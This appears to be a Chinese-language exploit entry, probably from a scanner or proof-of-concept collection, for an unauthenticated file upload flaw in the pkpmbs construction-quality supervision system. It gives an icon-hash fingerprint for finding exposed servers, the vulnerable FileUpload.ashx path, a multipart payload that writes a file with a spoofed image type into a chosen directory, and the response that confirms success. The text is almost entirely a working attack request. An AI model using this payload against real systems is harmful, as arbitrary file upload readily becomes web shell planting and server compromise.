# pkpmbs建设工程质量监督系统FileUpload.ashx文件上传漏洞

pkpmbs ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="2001627082"`
- **请求**：`POST /Platform/System/FileUpload.ashx HTTP/1.1`

**Payload**
```
------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="file"; filename="dudesuite.txt"
Content-Type: image/png
dudesuite
------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="target"
/Applications/SkillDevelopAndEHS/
------YsOxWxSvj1KyZow1PTsh98fdu6l--
```
- **响应特征**：200 dudesuite.txt